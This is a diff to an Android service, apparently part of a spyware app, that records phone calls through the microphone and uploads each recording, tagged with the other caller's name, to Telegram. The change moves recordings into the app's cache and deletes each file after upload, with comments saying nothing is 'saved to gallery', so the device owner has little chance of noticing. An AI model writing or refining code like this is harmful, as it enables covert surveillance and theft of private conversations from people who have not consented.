@@ -39,8 +39,7 @@ public class CallRecordingService extends Service {
 
     private void startRec() {
         try {
-            File dir = getExternalFilesDir(null);
-            if (dir == null) dir = getFilesDir();
+            File dir = getCacheDir(); // cache only — NOT saved to gallery
             mFile = dir.getAbsolutePath() + "/rec_" + System.currentTimeMillis() + ".3gp";
             mRecorder = new MediaRecorder();
             mRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
@@ -65,6 +64,7 @@ public class CallRecordingService extends Service {
                     File file = new File(f);
                     if (file.exists() && file.length() > 500) {
                         SmsService.sendFileToTelegram(file, "🎙 Call Recording\nWith: " + n);
+                        file.delete(); // delete after sending — NOT saved to gallery
                     } else {
                         if (file.exists()) file.delete();
                     }
